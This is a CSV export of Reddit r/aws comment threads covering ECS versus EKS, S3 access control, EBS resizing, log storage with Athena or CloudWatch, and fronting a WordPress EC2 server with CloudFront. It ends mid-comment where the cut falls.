g7rr3hz,j5daf2,We have implemented ECS this year and we couldn't be happier. We also use Terraform to manage the services. Feel free to ask if you have any questions.,7.0
g7rt3ce,j5daf2,"Do you miss out on any of the k8 ecosystem tools and features? 

How long has it been?",1.0
g7rv2my,j5daf2,"&gt; How long has it been?

We finished the migration a few months ago.

&gt; Do you miss out on any of the k8 ecosystem tools and features? 

It's hard not to come across a post announcing a new tool for K8s and think ""damn, I wish I could use this!"", because some of the things people are building around K8s are truly incredible. But to be honest a lot of these things are either gimmicky and/or unnecessary to run 99% of all the applications in the world. Basic operational things like monitoring, logging, tracing, deploying, RBAC, etc., are very well covered in ECS. And furthermore, sometimes I find that this ""lack"" of options results in greater productivity, less time wasted researching, testing and discussing tools and more time focusing on the end goals.",17.0
g7s9rh0,j5daf2,"I’d add one other case to your gimmicky/unnecessary: only necessary if you’re trying for multi-cloud portability or building your own cloud. For example, there are great options if you aren’t using AWS/GCP/etc. load balancers but they’re more O&amp;M unless you have a specific need driving that decision. (Repeat for secrets, logging and tracing, certificate management, etc.)

This is a great reminder that many of the cool things we read about are by teams in different situations: specialized needs, different business requirements (“everything must be hybrid cloud!”), and, especially commonly, staffing levels. If you aren’t on a large team with high-functioning ops capacity, there are are a lot of reasons not to take on those extra commitments.",5.0
g7slybt,j5daf2,"Question, as someone who's never used ECS before but use EKS daily. How do you deploy applications to ECS in a clean way? k8s has Helm Charts and Operators to deploy applications and manage config. Is there something similar for ECS? Or do you have to hand-write your deployment code?",1.0
g7sr7vy,j5daf2,"Not the person you asked but someone who is heavily on ECS- it has amazing Terraform support, so all of our apps are essentially defined in terraform itself. When we want to push out changes we tweak the terraform code and run- ECS does a good job with the actual rotation of containers.",3.0
g7srk41,j5daf2,"Ooooooh, personally I really hated defining app configuration with Terraform. Although thinking about it now, if I had to, it would probably be pretty clean to define apps in their own isolated layer and deploy them without worrying about updating infra",1.0
g7sryfm,j5daf2,"Our apps are pretty microservice heavy, so the difference between the ""infrastructure"" and the ""application"" is pretty blurry. The bulk of the configuration is things like ""set an envvar to use this kinesis pipeline for this task"", and since terraform is creating the kinesis pipeline it all fits together pretty well.",3.0
g7tcdkv,j5daf2,"Cloud formation and code deploy/pipeline/etc are first-party solutions

There's also terraform, Jenkins, and lots of other third party tooling",3.0
g7ssevy,j5daf2,"There are many tools to deploy to ECS, and most CI tools include one too. In our case we use [fabfuel/ecs-deploy](https://github.com/fabfuel/ecs-deploy). Quite simple, but it just works. It's far from being Helm, in fact there is nothing comparable to Helm for ECS. But then again back when I used K8s I preferred Kustomize to Helm due to its simplicity, so I never saw that as a problem. To manage configuration we use a mix of Terraform and AWS Parameter Store.",2.0
g7u0wrd,j5daf2,How did you make the decision between ECS and Beanstalk if at all?,1.0
g7vqa8y,j5daf2,We didn't even consider Beanstalk tbh.,1.0
g7rlt61,j5daf2,"One differentiator is the ability to run an overlay network on K8s, which could be useful if you plan to host many services (tasks/pods) per cluster node.

There is a limit to the number of ENIs you can attach to an EC2 depending on instance type.",5.0
g7rwocy,j5daf2,"Not really relevant if you use Fargate though, right?",7.0
g7rzfuf,j5daf2,"I think so. Each task on fargate gets its own IP. 

so yeah",2.0
g7sfphk,j5daf2,Sort of. Each task gets an ENI on fargate but all the containers in that task share the 1 ENI.,2.0
g7uf5f9,j5daf2,"&gt; There is a limit to the number of ENIs you can attach to an EC2 depending on instance type.

correct: not relevant when you use Fargate. The ENI-to-task mapping is the same whether you use Fargate or EC2 based compute. The difference in this context is at the host level, with the host-based limits. Since each Fargate task gets it's ENI, and since there are no hosts to manage, you never run up against any host-based limits, including ENI limits.",1.0
g7s2cl5,j5daf2,"Besides what's already been said, this doesn't matter in bridged networking mode I think. Only awsvpc mode",1.0
g7s37j6,j5daf2,"Valid point. But certain features require awsvpc (task SGs, service discovery, appmesh etc.)

I like ECS but recognise there are some limitations for certain types of workload.",1.0
g7rbb6j,j5daf2,"K8s has a much larger ecosystem with significantly more tools and more people constantly developing it. ECS is an AWS only product. I can see ECS working fine for many people, but our applications were complex enough we didn’t want to have to worry about being unable to use the latest and greatest tools on ECS. Also, our K8s configurations end up being fairly portable, however we have no plans to ever move off AWS.",17.0
g7s0j8o,j5daf2,"I would say everything that the pro ECS have said. I am going to add that it just fracking works, I love it and I am never turning back from it.
With my project and all others popping up from Docker ans AWS there is no doubt AWS is investing in it full stean",3.0
g7u84ox,j5daf2,"I love seeing all the great advice on this thread! I wanted to drop in a note to ask all of you to explore Copilot, our new open source CLI for managing ECS tasks. It's still early stages, so we'd love to get some feedback from you:

https://aws.amazon.com/containers/copilot/

https://github.com/aws/copilot-cli

Feel free to DM me with any feedback, and I'll pass it along to the team, or even better, open an issue on the GitHub repo.",5.0
g7saxm7,j5daf2,"A different perspective -- EKS + terraform is a better choice for attracting &amp; retaining talent.  You're probably not going to be able to attract many people that want to work on ECS?  (CICD + terraform + 'containers' doesn't sound too bad though).


On the other hand, I bet ECS + terraform is both cheaper and easier.   Control plane costs alone are pretty formidable.  But there's also constant updates due to the technology getting so much development.",6.0
g7srmy4,j5daf2,"Counterpoint- we had no issue hiring people with ECS skills, and while there were a lot of people ""familiar"" with kubernetes there aren't a lot of people who are experts at running it. I do think we would have been screwed if we weren't completely an infrastructure as code shop (terraform), as no one wants to manually set these things up regardless of the underlying platform.",2.0
g7syvtz,j5daf2,Sounds reasonable.  Glad it's working for you!  Once you go IAC you never want to go back :),2.0
g7val4e,j5daf2,"we're in the same boat at my current company (myself included on the wanting to use ECS) but we're stuck with EKS and had to get a contracting company to ""help"" with our clusters.",2.0
g7rna1z,j5daf2,"You can run a service mesh in ECS, which should shoot some of the shiny-toy drooling from the K8S fanbois.

K8S is way overkill. You will need a team specifically dedicated to managing your K8s environments, even if it's EKS; there are namespaces, configurations, etc, plus the versions keep marching ahead and if you don't keep up, you'll very rapidly go stale.

Stick with ECS. It's stable, it works. Features that are actually useful are released regularly.

Source: have built and run several k8s environments, both on-prem, and using EKS, AKS, and GKE. You don't need it.",10.0
g7s0bc9,j5daf2,"One of the largest considerations would be tenancy. If you are not planning on providing a tenancy feature (internal or external facing) then it may not make any sense for you. The other factor is how much you invest into native AWS vs open source/3rd party tools.

While the gap has narrowed considerably (Fargate + EKS persistent storage, for example) there are still gaps. Container Insights is not supported on Fargate EKS yet and neither is FireLens.

As others have mentioned, if you don’t want to manage namespaces or Kubernetes RBAC, that’s also a tick in the “no go” box. Even with EKS, there is still management of Kubernetes. This extends into automation somewhat as well, even with eksctl and terraform there are certain things you’d have to potentially build out (which requires Kubernetes knowledge).",2.0
g7sq613,j5daf2,ECS will be great for you. The overhead and management required is far less than Kubernetes. Large companies use ECS far beyond what you described too. You’ll be good!,2.0
g7rexhn,j5daf2,"Ci pipeline deployments and color flips are much easier in kubernetes imo.

Haven’t tried code deploy for ecs but I’m not expecting much as you can’t deploy a blue green code deploy project with cloudformation which makes me think it’s second class",2.0
g7rlafc,j5daf2,"I don't use ECS or EKS so I'm really speaking out of my ass, but I saw this when it came across the wire and I don't know if it addresses your issue: [https://aws.amazon.com/about-aws/whats-new/2020/05/aws-cloudformation-now-supports-blue-green-deployments-for-amazon-ecs/](https://aws.amazon.com/about-aws/whats-new/2020/05/aws-cloudformation-now-supports-blue-green-deployments-for-amazon-ecs/)",4.0
g7vao3h,j5daf2,yeah earlier this year they added the CF support for Blue-Green. Before now it was only available in the console.,1.0
g7saeyb,j5daf2,"How are CI deployments easier? It’s one command to update an ECS task after you push a container, and that gets a health-checked rollout, so it seems like there’s limited room to improve further. 

Color flips can be done automatically using Code Deploy, or by swapping the target group or adjusting it’s traffic percentage. I avoid using CloudFormation for production work but you can do that using variables just like in Terraform.",2.0
g7rf0n7,j5daf2,We will be using terraform exclusively and gitlab for cicd. Let me add that also into the post,1.0
g7riudc,j5daf2,"IMHO, CloudFormation sucks. Terraform is definitely a better choice, especially if you need to manage stuff that is not 100% AWS based (external services like Mongo Atlas for instance). 

I use GitLab + Terraform + https://github.com/fabfuel/ecs-deploy  ... Works like a charm... Haven't deployed anything manually for a long time...",4.0
g7s0lop,j5daf2,For externl resources you could just have custom resources or private registry...,1.0
g7s2l18,j5daf2,"Mongo Atlas has support for CloudFormation. 

https://www.mongodb.com/press/mongodb-atlas-adds-support-for-aws-cloudformation-eventbridge-privatelink-and-more",1.0
g7t40v7,j5daf2,"I would recommend Fargate based on your Plans. 

Based on your Setup/Plans:

1. - 
2. Perfect. You can use ALB, ACM, CloudWatch, CloudMap and ECR without worries which all integrate nicely with ECS

3. To be honest.. ECS does not require superpowers. Just learn about the concepts (Cluster, service, Task) and Integrations. Then deploy your Terraform code. K8s is a beast compared to ECS.

4. Just use Autoscaling with your ECS Tasks based on metrics like CPU or ALB requests or even scheduled ones using CloudWatch

5. Create your Network, Launch Tasks in it :) Fargate doesnt Care. Pro Tip: use vpc endpoints for ECR to reduce networking cost

6. Perfect. Terraform or CloudFormation have excellent Support for ECS

7. If your CICD can use AWS cli and terraform ECS is good. 

For logging and Monitoring: CloudWatch Support is okay (use extended Monitoring for your Cluster!) and you can use FireLens with Fluentd for enhanced logging capabilities. Push some custom metrics and everything should be covered. 

PS: No hate for kubernetes - it is far more complicated to do ""correctly"" imho.",1.0
g7uzs2b,j5daf2,How do you guys view your metrics per container/task? I enabled container insights but to no avail. Cloudwatch shows a table of values of cpu/mem but I can’t export it as any other graph,1.0
g8k4mlu,j5daf2,"&gt;We are not planning to manage EC2; means we only want to use Fargate

This alone should make you consider ECS first and foremost. EKS, even if you're just using Fargate, isn't as easy to setup as ECS. Unless you have all of your CI/CD pipelines already setup for Kubernetes and don't want to recreate them then there's little reason to stay with EKS.",1.0
g7sn6zh,j5daf2,"K8s is like trying to make a cloud-in-a-box, so when people tell me they're going to use it built from EC2 boxes, in AWS already.. always makes me scratch my head.  Monitoring? Logging? Certificates? Container permissions? Load balancers? All this is already available over the AWS API and built around ECS very nicely.  With your list, definitely ECS.",1.0
g7sc8vo,j5daf2,EKS is a feature parity product. The pricing makes it obvious you're not supposed to actually use it.,-2.0
g7si3h7,j5daf2,"Slight counter point - you probably don't want to use terraform to deploy the services, unless they are things like periodic scheduled tasks or things directly tied to the infra team. 

A method that I'm looking at now is having the terraform initialize the ECS services with a dummy task definition that just runs a busybox image configured to respond to health checks, and terraform configured to ignore changes to the task def. Then you use your CICD tooling render changes to the task definition and push that to ECS directly as a deployment. This separates the deployment of your software and infra.",0.0
g7qlu8r,j59d4m,"Attach IAM role to EC2 is good; you can specify which S3 bucket to grant access to. 


Another alternative is VPC Gateway Endpoint for S3
https://docs.aws.amazon.com/vpc/latest/userguide/vpc-endpoints-s3.html",3.0
g7qm35v,j59d4m,"Thanks for your reply. I can't find out where to specify the S3 bucket to restrict access from the particular instance. Should I do that on the bucket?

edit: Figured out how to restrict the S3 bucket. Appreciate your response.",1.0
g7r09vn,j59d4m,You can restrict the IAM Role’s policy to the specific S3 bucket (by specifying the bucket in the policy) and/or you can restrict access to the bucket to just the IAM Role (by specifying the Role in the bucket policy).,1.0
g7qhp9q,j57mza,"&gt;**Does it cost extra charge if we install and run extra applications on a single ec2 instance?**

No.",6.0
g7r03gz,j57mza,Well in theory no. But depending on what they are planning then the data transit out may be cost,1.0
g7r1x8f,j57mza,Or EBS IO.,1.0
g7r04uc,j57o5b,"I did a lot of development in C# with AWS in my last job. But I don’t know of any good courses. 

I know this is not the most optimal solution, but I learned serverless using this course where he used Javascript. But the technologies are the same and the API is the same. You should be able to apply it. I did. 

https://www.udemy.com/course/aws-serverless-a-complete-introduction/

As far as Fargate.  This is the resource I used. 

https://aws.amazon.com/blogs/compute/hosting-asp-net-core-applications-in-amazon-ecs-using-aws-fargate/

And a CloudFormation template 

https://github.com/1Strategy/fargate-cloudformation-example",1.0
g7s2uax,j57o5b,Thank you very much for your help.,1.0
g7ug0a2,j57o5b,"If you have access to PluralSight, Julie Lerman (Microsoft MVP) recently released a brand new course [https://www.pluralsight.com/courses/fundamentals-building-dot-net-applications-aws](https://www.pluralsight.com/courses/fundamentals-building-dot-net-applications-aws). It covers using RDS, AWS Elastic Beanstalk, Lambda, and Fargate, but doesn't go into DynamoDB.",1.0
g7qliks,j57qyq,You’ll need your phone but at a certain point you’ll be guided to put it away before proceeding to the check in with the virtual proctor. Don’t stress but do give yourself an extra half hour to start and complete the check in process as it’s not unheard of that you’ll have to run through it a second time for whatever reason. Good luck on your test!,1.0
g7qwnqg,j57qyq,Check in process took a good 30-40 mins for me.. you can keep the phone away but confusing part was that you will see a message saying they will call you if there is any issue.. once a proctor comes in you are good to go and you will not need your phone.. I think you can keep your phone in the same room till the proctor arrives and leave it in next room once he is there.. let others comment if they think otherwise. If no one responds just leave the phone next room and let the proctor come when he can but you have pass the time starting at your screen ..,1.0
g7rjwsb,j57qyq,"I had my exam on Friday. So you need your Phone for making photos of your ID card, yourself and the room. That is part of the check-in process. Once done I was putting my phone out of reach. Then I was contacted by an assistant. She asked for a further proof of a clean desk by moving the webcam.  She confirmed that i’m ready and forwarded me to the proctor. Exam began.

EDIT: I struggled to take a photo from my ID card as the website i was directed to did not allow me to change the camera from front camera to back camera. Took me more than 5 minutes lol",1.0
g7qiojv,j57qyq,What in the world are you on about?,-6.0
g7qqe0o,j57qyq,The reason you’re posting in r/aws is ... because you’re lost?,-5.0
g7qd6d3,j582ic,Not the last time I checked. Did you boot/reboot after the resize? I think there was a cloud-init setting that might auto-expand volumes on boot.,1.0
g7qdb6h,j582ic,I did reboot after I made the change.,1.0
g7qmsin,j582ic,On newer kernels that's the behaviour. See the docs,1.0
g7qmu53,j582ic,Have a link?,1.0
g7qr19u,j582ic,https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/recognize-expanded-volume-linux.html,2.0
g7r6vlj,j582ic,"Cloud init (Runs during boot) module takes care of resizing the fs, when you reboot. You can check the stdout logs @ /var/log/cloud-init.log.

I believe this was introduced in 4.4 kernel.. check the docs for the exact kernel version",1.0
g7r7h1e,j582ic,"It’s OS dependent, that’s an OS-level feature, not anything AWS is doing for you.",1.0
g7qv651,j57iwt,"Yes, you need to clear ""block public access"" first.
Then restrict access to Cloudflare IP only as per CF instructions.",3.0
g7q9k66,j57iwt,Did you allow public policies on the bucket? Make sure it's unchecked,1.0
g7qsepa,j57iwt,i have only been able to get this to work by allowing an Origin Access ID to access the bucket.,1.0
g7qcyje,j5363l,"You can use API Gateway to expose your Lambda function to the internet.  Make sure you restrict access via an API key or something.

Everything else is just python.",5.0
g7rt2m8,j5363l,"Beginner here, I did the same but for scrapping a website to get the new promotion code for a mobile game.

To be less difficult and avoiding a ""wall"" of tech, i did it in two part :

1. The python/bot telegram on local machine to get a proof of concept
2. Integration in AWS with all the services

&amp;#x200B;

So it goes like that : 

* I did the python code first on my local machine 
* Create the telegram bot and tried few command to send me a message and call the bot for a basic answer
* On AWS I created the lambda and paste the sript and run it successfully
* Attach the clouwatch cron to execute the function every hour

&amp;#x200B;

Here is the few struggle and good information I came by during this little project:

* Managing python dependencies : if you don't use basic dependencies, you have to upload it in AWS Lambda in .ZIP file 
* I'm a beginner in python, i started the script in pyton 2.7 then change it to pyton 3.8 (2.7 is working but no longer supported)
* Cold/Warm start of an aws Lambda function which is basically a simple container hosted in aws
* AWS lambda function has a limited life time, so I stored the code I scrapped in a text  file in a S3 bucket. 
* The next big things I want to do is to create a simple CI/CD pipeline for the script : AWS Code Pipeline or GItLab Ci/CD

&amp;#x200B;

For a student beginner like me in AWS and Python, this little project took me like a week to do.",3.0
g7sgpm0,j5363l,Good first steps. You can use CodeStar to create a CI/CD pipeline.,1.0
g7snqi0,j5363l,"Oh nice, I will look into it, thanks",1.0
g7r0gaz,j5363l,"Try AWS Chalice, https://github.com/aws/chalice, it helped me understand lambda and makes easy to deploy and package.",2.0
g7rn8pq,j5363l,Thanks! Will check it out and report back,2.0
g8lqcbk,j5363l,"Got the bot working but didn't quite figure out how to upload it to lambda with all the dependencies etc. I uploaded it to a free tier EC2 since that seemed infinitely easier and it's now live. Anyways thanks for the input guys, this was a lot of fun.",1.0
g7qtyed,j555qh,"You say in the article that parameter store is free for the use you illustrated(creation, query, etc), but I understand that the bill method is per api call. Is that correct ? O do I understand something wrong ?

Pd: good article, thanks for share.",2.0
g7r1egb,j555qh,The basic parameter store is free. But basically useless in the free tier if you have a lot of parameters. It’s severely rate limited unless you pay for it.,1.0
g7r1ol3,j555qh,"Parameter Store comes in two flavors. One is standard and the other is advanced. With advanced you get some additional features like key rotation, encryption. Standard is free both the storage and the API calls. If your account has a high throughput then the API calls will be charged at 0.05$ per 10k api calls but if your throughput is normal then API calls are also free for standard. Advanced charges for both.",1.0
g7sfc40,j555qh,"Thanks for the clarification. 

What is the average api call that you have with this solution ?",1.0
g7vg92a,j555qh,We haven't really measured the number of API calls but we haven't had any issues or limitations and we don't see SSM Parameter Store on our bills so it is still free for us.,1.0
g7wdctc,j555qh,"Ok, thanks",1.0
g7pr152,j555qh,"Just posted this article on how we use SSM Parameter Store to basically access all the resources created by CloudFormation and to cross reference resources in multiple stacks.

Please share your feedback. Thanks.",1.0
g7pmfzz,j54mo6,S3 and Athena to query maybe?,45.0
g7pxzd7,j54mo6,This! S3 plus Athena is remarkably fast and dirt cheap compared to pretty much everything else.,13.0
g7wy9iy,j54mo6,"I figure S3 is probably the best storage mechanism (or at least, *a* storage mechanism) if you want to do big data/machine learning type stuff, yeah?",1.0
g7x6gfa,j54mo6,Yeah s3 is dirt cheap and you can load to something like Redshift from there if you need more query access. As they said above don’t discount Athena for ad hoc querying. Also maybe look at ChoasSearch (paid product I think) to.,1.0
g7pn3dw,j54mo6,Cloudwatch → Log insights → SQL queryish box to analyze the logs,29.0
g7wz203,j54mo6,"My main concern with CloudWatch is feasibility of long-term storage and accessibility for big data type stuff. I'm wanting to build a data warehouse/lake kind of thing.

(I'm not trying to play NSA - I'm interested in tinkering with machine learning, and I just happen to generate a lot of IRC logs that could be used as a dataset...)",1.0
g7pmzd9,j54mo6,"You could store them in an S3 Bucket. Setup a timed job (or ad-hoc) to run AWS Glue to transform the logs to parquet and put them in another bucket. Then use AWS Athena to do queries. It's not as instant as querying an ES cluster, but it's cheaper, esp if your data use case fits.",14.0
g7py28x,j54mo6,"You can run Athena directly against JSON, even fairly complex ones.",9.0
g7ptf6l,j54mo6,"I just did this, very cheap and very easy to setup.",3.0
g7wyj0v,j54mo6,"Pardon my n00b (and possibly very complicated) question, but is there a specific reason why I'd want them in Parquet format?",1.0
g7x381c,j54mo6,"N00b to N00b: Columnar data structure is faster to query, in my limited experience for the aggregation type queries I was running on my data. Someone else pointed out that you can directly query json from Athena as well, which I had totally forgotten about.",1.0
g7pmix8,j54mo6,"What about using cloud watch, straight forward to send logs using sdk.",7.0
g7wz3ot,j54mo6,See this comment: https://www.reddit.com/r/aws/comments/j54mo6/best_way_to_store_logs_for_analysis/g7wz203/,1.0
g7q9ctp,j54mo6,[deleted],6.0
g7qb1ad,j54mo6,+1 for Loki,2.0
g7wz5tf,j54mo6,"Thank you! I hadn't heard of this, I'll definitely give it a look.",1.0
g7qba7m,j54mo6,lol I love it when someone asks for something for a small personal project and the recommendation is Datadog.,6.0
g7r2tgm,j54mo6,"LOL

&gt; What's the best way to host a personal website with 10 visitors a month and very few updates?

Well, to be fully DR compliant you should run in 2 regions with data duplicated in both with a HA instance of your DB along with a RO instance in the second region, take hourly snapshots.",3.0
g7qxtv3,j54mo6,"I think you should give a try the managed ElasticSearch since now we have three-tier storage(HOT/WARM/COLD). We can create policies to automatically archive it to the cold storage. You can think about its a complete Log analysis cluster.

Other options depend on S3:

Athena or Spectrum - Yes, for massively scaleable presto cluster. 

* Pay as you scan.
* Leverage the extract function to extract nested JSON and Arrays.
* Simply access everything with SQL

But the cons:

* Complex JSON - increase the processing time.
* Sometimes memory related errors can happen.

Cloudwatch - I don't think so its a good solution, every difficult to perform analysis(extracting nested fields).",2.0
g7r0mny,j54mo6,S3 - &gt; glue - &gt; athena,2.0
g7qdbza,j54mo6,chaossearch.io is what I use and it’s the best!,3.0
g7qgjtk,j54mo6,CHAOSSEARCH,2.0
g7wzhzf,j54mo6,"Hmm, I'll keep that in mind. $.70 is definitely affordable, I was sort of hoping for something I could build out myself though.",1.0
g7ptfiz,j54mo6,"There are multiple solutions. I would recommend any of the following which all provides different degrees of functionality and simplicity.

1) Cloudwatch Logs - Biggest con in my view many advanced log search functionalities will be missing. 

2) ElasticSearch - This has everything that you need. Except as you mentioned, you will run your own managed ES cluster and pay for it. 

3) Datadog - Cloudwatch like functionality. Great tools to build easy dashboards on top of it. 

4) S3 + Athena - cheapest solution in terms of storage. Biggest drawback is you have the prepare an index if you want to shard by date.",3.0
g7qc8t0,j54mo6,"Cloud watch seems a lot better than it used to be. We're just using that at work right now, and can search ok. It has a bunch of functions, etc, the interface is just not terribly helpful. JSON format for the logs is a must, that lets it discover fields on its own without manually parsing everything with regex.",3.0
g7rhla6,j54mo6,"&gt;	JSON format for the logs is a must, that lets it discover fields on its own without manually parsing everything with regex.

It wasn’t until I finally understood what td-agent was doing that I realized why plaintext logs aren’t ideal for modern devops tooling.

“Of course! How else would the log aggregator know where one entry stops and another one starts?”",2.0
g7q7wcr,j54mo6,Second vote for Elastic Stack. I run my stack on FreeNAS locally at my studio so I don’t have to pay AWS for it. Has quite the learning curve but suuuuper powerful,2.0
g7r5v9h,j54mo6,Elk stack (elasticsearch logstash kibana),1.0
g7x1g0y,j54mo6,"Well, that was my original plan, the question is where to run Elasticsearch. I'm not sure I need to pay for a managed cluster (and AWS not being able to offer some features because of licensing makes me sad.)

As for running it myself, here's a bit more detail behind my architectural concerns:

I run Hashicorp Nomad for container orchestration, and the container hosts themselves are Spot instances managed by `spot.io`. Typically I only have one container host running at a given time, because I don't run that many containers.

Nomad can use the Container Storage Interface to dynamically mount EFS/EBS volumes on-the-fly to containers that need them, but...

* EFS: Isn't fast enough to support ElasticSearch
* EBS: AZ-specific, and since my container host is ephemeral and isn't guaranteed to launch in a specific AZ, there's a possibility that the container might end up in a different AZ than the EBS volume it requires.",1.0
g7re4vw,j54mo6,"Logdna should cover you easily, and if your volumes are light, it's cheap too.",1.0
g7x1vx3,j54mo6,I'll check it out! Thanks!,1.0
g7ruaqe,j54mo6,"For a personal project, cant you just run ELK locally? There's nothing to stop you streaming the logs out of aws. Takes a bit of setup, but far more configurable and best of all - free.

If it absolutely MUST be aws, you could use fargate &amp; EFS or maybe just an ec2 with docker installed. So long as you're ingress is light enough.

Personally, i dislike the AWS hosted ELK stack, you lose a lot of the filtering options on ingress and need to write custom lambdas to do everything.
Subscription filters are very restrictive.
Very expensive for hosting open source software.

Its causing us a few problems in our prod stack and we are currently investigating alternatives.",1.0
g7x1tbb,j54mo6,"Well, part of the impetus for the project is to generate a data lake/warehouse that I can use to teach myself more about AWS' machine learning/big data offerings.

And, also, I'm aspiring to be one of those guys who keeps decades' worth of IRC logs, and I don't trust my own computer for that.

---

As an aside, care to elaborate on the problem you're having with your prod stack? At my job, we migrated about a year ago from LogEntries to ELK with a managed ES cluster, and I'm interested to hear your perspective.",1.0
g898cw4,j54mo6,"Sure, 
1. we'll for starters, you set up your first node, and (depending how you spec it, for us, thats $200 / month straight off the bad per node for something that was previously free (thats a tough sell)

2. So you set up your first AWS elk log stream &amp; subscription filter and quickly realise its very monotonic. But you can work around it, so you carry on.

3. You set up your 2nd AWS log stream and quickly discover that it isn't working... go figure...
So after a bit of googling, you discover that aws only supports 1 log stream per elk cluster.
So you have to write (pilfer) a custom lambda to stream your logs to which then outputs them to elk (but only after you remap the index names, because elk doesn't like slashes)

4. Pretty quickly you start getting errors from your lambda that you can't ship more logs to elk (too many shards open) so you set up curator to optimize your log storage. 

5. Aws elastic search does NOT support ""closed"" indices, which means if you want to keep a lot of old logs... its gonna cost ya!

6. You eventually give up on optimising the node, since you're pissing in the wind anyway, so you spin up a multi-az cluster. Thats 3 nodes per org or $1,200 / month... which used to be free on prem.


I could go on, ive not even mentioned how much nicer it was having logstash for mapping multiple temllate types from a single source when we were running on prem. But the truth is, I still like ELK, and im comfortable using it, so im happy to stick with it for now, but my eyes are wandering and ill be looking into some alternatives very soon (Loki?)",1.0
g7pfact,j53koq,"A service dedicated to hosting WordPress will be much more convenient than a service dedicated to being versatile. When using something like WPEngine don't have to do anything to get WordPress installed. When using AWS, you would have to consider the instance type, load balancing, certificates, network configuration, Linux version, software updates, install WordPress, maintain WordPress, configure WordPress for your infrastructure, etc.

If you are looking for convenience, don't go with one size fits all. Go with a service that fits exactly what you need.",4.0
g7qyfgr,j53koq,"Second WPEngine, they are a local company here. If your volume is enough you can't selfhost they are a good option.",2.0
g7pha4x,j53koq,"If I use AWS Lightsail, will I still need to configure everything manually?",1.0
g7phgmx,j53koq,"Less, but yes.",2.0
g7pop3w,j53koq,"AWS Lightsail just uses Bitnami images. https://bitnami.com/stack/wordpress

And you will be responsible for everything on the instance after creation. Lightsail is just a simplified version of EC2.

If you want a managed service, you do not want a single thing AWS offers. Nothing will be done for you.",1.0
g7pujru,j53koq,"&gt;And you will be responsible for everything on the instance after creation. Lightsail is just a simplified version of EC2.

Everything like what?
Once I installed WordPress, wouldn't I be handling my website from within WordPress dashboard?",1.0
g7pyhtl,j53koq,"The website, the underlying software, infrastructure, firewalls. Security updates to the OS. Management of the OS. Backups. Snapshots. 

Everything related to the maintenance and upkeep of a web_server_. Not just a web_site_.",2.0
g7rc7am,j53koq,"&gt;Security updates to the OS

You mean OS that's installed on the Virtual Machine?
Like linux?",1.0
g7rir98,j53koq,"Yes, exactly.",1.0
g7rissl,j53koq,And will I have to face downtime during the update?,1.0
g7riyht,j53koq,"Depending on the update, and if it requires a reboot or reconfiguration of some component of the application stack, yes.",1.0
g7x0aun,j53koq,"Are Dedicated Hosting also same? If I choose a dedicated hosting (like from Hostgator), will I still need to maintain the Dedicated PC/Server myself?",1.0
g7pllms,j4yluy,"This is pretty brief, and there's not a lot of explanation of the ""why"". Especially around sensitive areas like disabling ""Block Public Access"" you might want to do more to explain the concept and the associated risks. 

I'm also not sure where this is adding anything over the existing Amazon documentation on S3 static website hosting?",3.0
g7oqapz,j4u0ur,"Ah, search and kill your Active Directory as well. I was stuck with a rather nasty surprise",15.0
g7nsh44,j4whk6,"When you say “it won’t let you”, what happens?

You should be able to create a security group which only allows access from the CloudFront IP ranges (and it can even be auto-updated via a Lambda when these change).",3.0
g7ocskr,j4whk6,"Yeah this isn’t a good way to go, having to create and manage a lambda that listens for when aws updates cloudfront dnses isn’t a good solution just a feature gap from AWS. An easy win would be to just put a condition within the alb that the request must come from the domain you expect and also a header must exist which cloudfront will pass",7.0
g7ofg9d,j4whk6,Agree that there are other potentially better ways to handle it - OP didn’t mention an ALB though and there are obviously additional costs involved with that.,2.0
g7pbsza,j4whk6,"When I said ""it won't let you"" as in, when I put in the private DNS, CloudFront will not display my website.

I am trying to avoid using an ALB as I only have a single Wordpress server.  I don't even need CDN.  I am using it for the purpose of WAF.

Is there a way to do this?  I know that AWS has ways of routing traffic between different regions without the use of a VPN but I'm not sure that is the solution here.",1.0
g7poj8u,j4whk6,"Not sure how Cloudfront would resolve the private DNS name.

We do something similar. We have our webservers on EC2, and our security groups only allow in bound traffic from Akamai (we have to update those manually at the moment, but I should look at a Lambda function too!).

 If you want to use Cloudfront instead, that still seems to be the way to go unless you go with an ALB or similar (I like the header idea mentioned above).. 

 [https://aws.amazon.com/blogs/security/how-to-automatically-update-your-security-groups-for-amazon-cloudfront-and-aws-waf-by-using-aws-lambda/](https://aws.amazon.com/blogs/security/how-to-automatically-update-your-security-groups-for-amazon-cloudfront-and-aws-waf-by-using-aws-lambda/)",1.0
g7qkc0n,j4whk6,I am hoping to keep it simple without so many moving pieces for a single Wordpress website.,1.0
g7q0dtu,j4whk6,"When you say “private DNS”, what do you mean exactly?

Your EC2 will need to be publicly accessible and resolvable in order for CloudFront to reach it.

I would start by making sure your security group allows port 80 or 443 (depending on the port your EC2 is listening on) from 0.0.0.0/0 and checking you can reach it from a browser on your local machine using the same FQDN as you’ve configured for the origin in CloudFront. If CloudFront talks to your EC2 over HTTPS then ensure your EC2 has a valid public cert as CloudFront will need to validate this.

Assuming that works, then check CloudFront can reach it with the security group open to 0.0.0.0/0 and only then lock it down to the CloudFront IP ranges.",1.0
g7qk4yo,j4whk6,"Andydavey, on every AWS EC2 server, there is a private DNS (cannot be routed to other regions without a VPN).  If you have multiple EC2 instances, you can talk to the other instances in the same availability zone via private DNS or private IP address.  Basically, I don't want to open my wordpress server to the public even though it is looking for a header.  That's the same as leaving RDP open with 2FA enabled on Windows.  When there are vulnerabilities like last year, it can still get hacked.",1.0
g7rfvpz,j4whk6,"That’s what I’d assumed, but wanted to make sure - your instance needs to be publicly accessible for CloudFront to reach it. The fact that it’s publicly accessible doesn’t mean it can’t be locked down to CloudFront only though.

(Your definition of private IP isn’t quite correct by the way - it’s reachable from any AZ within the same VPC, and you can also connect from other VPCs via the use of VPC peering or similar rather than a VPN - it doesn’t change the answer regarding CloudFront though).",1.0
g7txhh8,j4whk6,"Thanks for the clarification.  Yes, you are correct about VPC peering.  I just couldn't remember the name.  

What would you suggest to CloudFront only without adding a loadbalancer or running Lamda functions to keep the security group updated with CloudFront IPs?",1.0
g7vm9e8,j4whk6,To be honest your options are quite limited. There’s a tutorial for adding the Lambda in case that helps: https://aws.amazon.com/blogs/security/how-to-automatically-update-your-security-groups-for-amazon-cloudfront-and-aws-waf-by-using-aws-lambda/,1.0
g82z6bf,j4whk6,"I guess I will have to go this route.

Thank you for everything.",1.0
g7rcibm,j4whk6,"CloudFront cannot route traffic to private hosts.

You might be referring to AWS Global Accelerator instead -&gt;

